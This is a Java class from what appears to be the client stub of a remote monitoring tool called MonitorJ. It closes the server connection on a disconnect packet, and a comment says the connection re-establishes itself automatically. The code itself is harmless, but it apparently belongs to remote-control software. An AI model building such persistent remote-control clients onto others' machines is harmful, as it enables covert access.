package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.MonitorJStub;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

/**
 * Created by Josh on 21/06/2015.
 */
public class DisconnectClientTask extends PacketTask {

    public DisconnectClientTask() {
        super(Packets.DISCONNECT_CLIENT);
    }

    @Override
    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
        MonitorJStub.getInstance().getClientServerConnection().getServerSocketConnection().close();
        //Connection will automatically re-establish itself in the BaseClient class Thread.
    }
}
